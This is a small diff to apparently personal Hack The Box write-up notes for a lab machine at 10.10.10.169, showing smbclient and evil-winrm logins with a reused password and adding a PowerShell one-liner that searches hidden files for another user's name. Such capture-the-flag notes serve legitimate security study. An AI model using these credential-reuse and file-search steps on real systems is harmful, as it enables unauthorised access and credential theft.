@@ -16,6 +16,9 @@ password reuse
 smbclient -U melanie //10.10.10.169/NETLOGON Welcome123!
 
 evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
+
+#search all files with word in it
+ls -R -Hidden -EA SilentlyContinue | select-string ryan
 ```
 
 HTB writeups
